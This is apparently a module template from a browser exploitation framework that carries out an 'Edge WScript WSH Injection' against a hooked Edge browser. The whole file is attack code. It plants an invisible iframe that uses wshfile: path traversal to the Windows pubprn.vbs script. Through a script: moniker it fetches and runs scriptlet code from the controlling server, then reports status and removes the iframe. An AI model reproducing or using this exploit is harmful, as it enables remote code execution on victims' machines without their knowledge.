//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function(){
  var timeout = 5;

  if (!server.browser.isEdge()) {
    server.debug("[Edge WScript WSH Injection] Browser is not supported.");
    server.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser is not supported', server.are.status_error());
    return;
  }

  try {
    var wsh_iframe_<%= @command_id %> = server.dom.createInvisibleIframe();
    var server_host = server.net.httpproto + '://' + server.net.host + ':' + server.net.port;
    wsh_iframe_<%= @command_id %>.setAttribute('src', 'wshfile:test/../../../../../../../Windows/System32/Printing_Admin_Scripts/' + navigator.language + '/pubprn.vbs" 127.0.0.1 script:' + server_host + '/<%= @command_id %>/index.html');
  } catch (e) {
    server.debug("[Edge WScript WSH Injection] Could not create iframe");
    server.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Could not create iframe', server.are.status_error());
    return;
  }

  // clean up
  cleanup = function() {
    document.body.removeChild(wsh_iframe_<%= @command_id %>);
  }
  setTimeout("cleanup()", timeout*1000);
});
